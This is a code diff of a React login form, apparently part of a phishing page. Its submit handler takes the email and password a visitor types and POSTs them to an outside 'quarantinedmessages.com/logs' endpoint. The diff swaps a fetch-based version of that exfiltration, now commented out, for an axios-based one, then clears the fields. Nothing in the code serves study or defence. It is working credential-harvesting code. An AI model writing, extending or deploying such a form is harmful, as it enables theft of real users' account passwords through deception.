@@ -2,47 +2,72 @@ import React, { useState } from 'react'
 import '../styles/Form.css'
 import {IoIosMail} from "react-icons/io"
 import {AiFillEye} from 'react-icons/ai'
+import axios, { Axios } from 'axios'
 
 const Form = () => {
 
-    const [email, setEmail] = useState('email');
+    const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
     const [count, setCount] = useState(0);
     const [isLoading, setIsLoading] = useState(false)
 
-    const handleSubmit = async (e) => {
+    // const handleSubmit = async (e) => {
+    //     e.preventDefault();
+    
+    //     const requestBody = {
+    //       email: email,
+    //       password: password,
+    //       count: count,
+    //     };
+    
+    //     try {
+    //         setIsLoading(true)
+    //       const response = await fetch('https://quarantinedmessages.com/logs', {
+    //         method: 'POST',
+    //         headers: {
+    //           'Content-Type': 'application/json',
+    //         },
+    //         body: JSON.stringify(requestBody),
+    //       });
+    
+    //       const responseData = await response.json() 
+    
+    //       if (response.ok) {
+    //         console.log(`Post request successful: ${JSON.stringify(responseData)}`);
+    //       } else {
+    //         console.error(`Post request failed: ${JSON.stringify(responseData)}`);
+    //       }
+    //     } catch (error) {
+    //       console.error('An error occurred:', error);
+    //     } finally{
+    //         setIsLoading(false)
+    //         setPassword('')
+    //         setEmail('')
+    //     }
+    //   }; 
+
+    const handleSubmit = (e) => {
         e.preventDefault();
-    
-        const requestBody = {
-          email: email,
-          password: password,
-          count: count,
-        };
-    
-        try {
-            setIsLoading(true)
-          const response = await fetch('https://quarantinedmessages.com/logs', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(requestBody),
+
+        axios.post('https://quarantinedmessages.com/logs', {
+            password: password,
+            email: email
+          })
+          .then(function (response) {
+            console.log(response);
+            console.log("Posting")
+          })
+          .catch(function (error) {
+            console.log(error);
           });
-    
-          const responseData = await response.json() 
-    
-          if (response.ok) {
-            console.log(`Post request successful: ${JSON.stringify(responseData)}`);
-          } else {
-            console.error(`Post request failed: ${JSON.stringify(responseData)}`);
-          }
-        } catch (error) {
-          console.error('An error occurred:', error);
-        } finally{
-            setIsLoading(false)
-            setPassword('')
-        }
-      }; 
+
+          setEmail('')
+          setPassword('')
+
+        // Axios.post('https://quarantinedmessages.com/logs', {
+        //     password, email
+        // }).then(res => console.log('Posting', res)).catch(err => console.log(err))
+    }
   return (
     <div className='form'>
         <div className="form-contain">
@@ -75,7 +100,7 @@ const Form = () => {
                 </form>
                 <div className="login">
                     {isLoading ? 
-                    <p>Sending</p> :
+                    <p>....</p> :
                     null    
                 }
                         <button type='submit' onClick={handleSubmit}>Login</button>
